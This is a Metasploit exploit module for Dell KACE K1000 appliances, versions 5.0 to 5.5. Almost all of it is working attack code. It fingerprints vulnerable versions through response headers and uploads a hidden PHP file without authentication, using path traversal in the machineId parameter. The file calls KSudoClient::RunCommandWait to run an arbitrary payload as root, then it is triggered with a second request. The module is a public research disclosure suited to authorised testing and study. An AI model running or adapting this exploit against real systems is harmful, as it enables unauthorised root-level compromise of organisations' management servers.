# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Dell KACE K1000 File Upload&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a file upload vulnerability in Kace K1000
        versions 5.0 to 5.3, 5.4 prior to 5.4.76849 and 5.5 prior to 5.5.90547
        which allows unauthenticated users to execute arbitrary commands
        under the context of the &#039;www&#039; user.
 
        This module also abuses the &#039;KSudoClient::RunCommandWait&#039; function
        to gain root privileges.
 
        This module has been tested successfully with Dell KACE K1000
        version 5.3.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;unix&#039;, # FreeBSD
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Author&#039;         =>
        [
          &#039;Bradley Austin (steponequit)&#039;, # Initial discovery and exploit
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039;, # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://console-cowboys.blogspot.com/2014/03/the-curious-case-of-ninjamonkeypiratela.html&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;BadChars&#039;    => "\x00\x27",
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl&#039;
            }
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 7 2014&#039;))
  end
 
  def check
    res = send_request_cgi(&#039;uri&#039; => normalize_uri(&#039;service&#039;, &#039;kbot_upload.php&#039;))
    unless res
      vprint_error(&#039;Connection failed&#039;)
      return Exploit::CheckCode::Unknown
    end
    if res.code && res.code == 500 && res.headers[&#039;X-DellKACE-Appliance&#039;].downcase == &#039;k1000&#039;
      if res.headers[&#039;X-DellKACE-Version&#039;] =~ /\A([0-9])\.([0-9])\.([0-9]+)\z/
        vprint_status("Found Dell KACE K1000 version #{res.headers[&#039;X-DellKACE-Version&#039;]}")
        if $1.to_i == 5 && $2.to_i <= 3                         # 5.0 to 5.3
          return Exploit::CheckCode::Vulnerable
        elsif $1.to_i == 5 && $2.to_i == 4 && $3.to_i <= 76849  # 5.4 prior to 5.4.76849
          return Exploit::CheckCode::Vulnerable
        elsif $1.to_i == 5 && $2.to_i == 5 && $3.to_i <= 90547  # 5.5 prior to 5.5.90547
          return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
      end
      return Exploit::CheckCode::Detected
    end
    Exploit::CheckCode::Safe
  end
 
  def exploit
    # upload payload
    fname = ".#{rand_text_alphanumeric(rand(8) + 5)}.php"
    payload_path = "/kbox/kboxwww/tmp/"
    post_data = "<?php require_once &#039;KSudoClient.class.php&#039;;KSudoClient::RunCommandWait(&#039;rm #{payload_path}#{fname};#{payload.encoded}&#039;);?>"
    print_status("Uploading #{fname} (#{post_data.length} bytes)")
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(&#039;service&#039;, &#039;kbot_upload.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_get&#039; => Hash[{
        &#039;filename&#039; => fname,
        &#039;machineId&#039; => "#{&#039;../&#039; * (rand(5) + 4)}#{payload_path}",
        &#039;checksum&#039; => &#039;SCRAMBLE&#039;,
        &#039;mac&#039; => rand_text_alphanumeric(rand(8) + 5),
        &#039;kbotId&#039; => rand_text_alphanumeric(rand(8) + 5),
        &#039;version&#039; => rand_text_alphanumeric(rand(8) + 5),
        &#039;patchsecheduleid&#039; => rand_text_alphanumeric(rand(8) + 5) }.to_a.shuffle],
      &#039;data&#039; => post_data)
 
    unless res
      fail_with(Failure::Unreachable, &#039;Connection failed&#039;)
    end
 
    if res.code && res.code == 200
      print_good(&#039;Payload uploaded successfully&#039;)
    else
      fail_with(Failure::UnexpectedReply, &#039;Unable to upload payload&#039;)
    end
 
    # execute payload
    res = send_request_cgi(&#039;uri&#039; => normalize_uri(&#039;tmp&#039;, fname))
 
    unless res
      fail_with(Failure::Unreachable, &#039;Connection failed&#039;)
    end
 
    if res.code && res.code == 200
      print_good(&#039;Payload executed successfully&#039;)
    elsif res.code && res.code == 404
      fail_with(Failure::NotVulnerable, "Could not find payload &#039;#{fname}&#039;")
    else
      fail_with(Failure::UnexpectedReply, &#039;Unable to execute payload&#039;)
    end
  end
end

